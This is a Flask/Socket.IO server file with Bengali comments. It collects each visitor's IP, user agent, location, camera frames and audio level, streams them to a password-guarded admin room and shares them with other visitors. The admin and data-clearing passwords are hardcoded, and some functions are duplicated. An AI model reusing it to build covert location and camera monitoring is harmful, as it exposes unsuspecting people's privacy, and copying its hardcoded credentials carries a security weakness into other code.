from flask import Blueprint, render_template, request, session, redirect, url_for
from flask_socketio import emit, join_room, leave_room
import base64
from main import socketio

bp = Blueprint('random_route', __name__, url_prefix='/random')

ADMIN_PASSWORD = 'admin123'
CLEAR_PASSWORD = 'arif123'

clients = {}        # key = IP, value = {id, ip, ua, location, frame, audio, sids, offline}
admin_rooms = set() # এডমিন রুম আইডি (আমরা সকেট আইডি ব্যবহার করব)

@bp.route('/')
def index():
    return render_template('random_index.html')

@bp.route('/admin')
def admin():
    if not session.get('admin_logged_in'):
        return redirect(url_for('random_route.admin_login'))
    return render_template('random_admin.html')

@bp.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        if request.form.get('password') == ADMIN_PASSWORD:
            session['admin_logged_in'] = True
            return redirect(url_for('random_route.admin'))
        return render_template('random_admin_login.html', error='Wrong password')
    return render_template('random_admin_login.html')

@bp.route('/admin/logout')
def admin_logout():
    session.pop('admin_logged_in', None)
    return redirect(url_for('random_route.admin'))

# ========== Socket.IO ==========
@socketio.on('connect')
def handle_connect():
    # ইউজার কানেক্ট
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    ua = request.headers.get('User-Agent')
    
    print(f"🔌 New connection: {request.sid}, ip={ip}")

    if ip not in clients:
        clients[ip] = {
            'id': ip,
            'ip': ip,
            'user_agent': ua,
            'location': None,
            'last_frame': None,
            'audio_level': 0,
            'sids': [request.sid],
            'offline': False
        }
    else:
        if request.sid not in clients[ip]['sids']:
            clients[ip]['sids'].append(request.sid)
        clients[ip]['offline'] = False
        # ইউজার-এজেন্ট আপডেট
        clients[ip]['user_agent'] = ua

    # সব এডমিনকে আপডেট পাঠাও
    emit_admin_update()
    print(f"✅ User connected: {ip}, total clients: {len(clients)}")

@socketio.on('disconnect')
def handle_disconnect():
    for ip, data in list(clients.items()):
        if request.sid in data['sids']:
            data['sids'].remove(request.sid)
            if not data['sids']:
                data['offline'] = True
                print(f"📴 User {ip} went offline")
            break
    emit_admin_update()
    print(f"📴 Disconnect, active clients: {len(clients)}")

@socketio.on('ready')
def handle_ready():
    print(f"✅ Received 'ready' from {request.sid}")

@socketio.on('location_update')
def handle_location(data):
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    if ip in clients:
        clients[ip]['location'] = data
        clients[ip]['offline'] = False
        emit_public_update()
        emit_admin_update()
        print(f"📍 Location from {ip}: {data}")

@socketio.on('video_frame')
def handle_video(data):
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    if ip in clients:
        clients[ip]['last_frame'] = data.get('image')
        clients[ip]['audio_level'] = data.get('audio_volume', 0)
        clients[ip]['offline'] = False
        emit_public_update()
        emit_admin_update()
        if not hasattr(handle_video, 'counter'):
            handle_video.counter = 0
        handle_video.counter += 1
        if handle_video.counter % 10 == 0:
            print(f"🎥 Video from {ip}, audio: {data.get('audio_volume',0)}%")

# ========== এডমিনদের জন্য আপডেট ==========
def emit_admin_update():
    """সব এডমিন সকেটে বর্তমান ক্লায়েন্ট ডেটা পাঠায়"""
    from flask_socketio import emit
    # এখানে আমরা admin সকেটগুলো আলাদাভাবে ট্র্যাক করি না, বরং broadcast করি একটি নির্দিষ্ট রুমে
    # কিন্তু রুম ছাড়াও আমরা সব সকেটে broadcast করতে পারি, তবে শুধু admin পেজের সকেটগুলো চিহ্নিত করা ভালো
    # যেহেতু admin পেজে কুয়েরি প্যারামিটার নেই, আমরা অল্টারনেটিভ পদ্ধতি ব্যবহার করছি:
    # admin পেজের JS-এ আমরা 'admin_ready' ইভেন্ট পাঠাব, যা এই ফাংশনকে ট্রিগার করবে।
    # এখানে আমরা সব সকেটে broadcast করছি, কিন্তু ক্লায়েন্ট সাইডে ফিল্টার করে নেবে।
    # তবে আমি আরও ভালো পদ্ধতি ব্যবহার করছি: admin পেজ কানেক্ট করার সময় আমরা 'admin' রুমে যোগ করব।
    # নিচে আমরা 'admin_join' ইভেন্টের মাধ্যমে রুম যোগ করব।

# আমরা 'admin_join' ইভেন্ট যোগ করছি
@socketio.on('admin_join')
def handle_admin_join():
    """এডমিন পেজ থেকে কানেক্ট করার সময় এই ইভেন্ট কল হবে"""
    join_room('admin_room')
    print(f"🛡️ Admin joined room: {request.sid}")
    # এডমিনকে বর্তমান ডেটা পাঠাও
    emit('admin_update', clients, to='admin_room')

@socketio.on('disconnect')
def handle_disconnect_admin():
    # ডিসকানেক্টে রুম থেকে বের করে দিই
    leave_room('admin_room')

# আমরা emit_admin_update() ফাংশন পরিবর্তন করি যাতে 'admin_room'-এ পাঠায়
def emit_admin_update():
    """সব এডমিনকে (admin_room) আপডেট পাঠায়"""
    from flask_socketio import emit
    emit('admin_update', clients, to='admin_room')

# ========== পাবলিক আপডেট (ইউজারদের জন্য) ==========
def emit_public_update():
    online_clients = {ip: data for ip, data in clients.items() if not data['offline']}
    online_count = len(online_clients)
    offline_count = sum(1 for data in clients.values() if data['offline'])
    
    for ip, data in clients.items():
        if data['offline']:
            continue
        filtered = {other_ip: other_data for other_ip, other_data in online_clients.items() if other_ip != ip}
        for sid in data['sids']:
            emit('public_update', {
                'clients': filtered,
                'online_count': online_count,
                'offline_count': offline_count
            }, to=sid)

# ========== ক্লিয়ার ==========
@socketio.on('clear_data')
def handle_clear(data):
    password = data.get('password')
    if password == CLEAR_PASSWORD:
        clients.clear()
        emit('clear_all', broadcast=True)
        emit_admin_update()
        print("🗑️ All data cleared")
        return {'status': 'ok'}
    else:
        return {'status': 'error', 'message': 'Wrong password'}
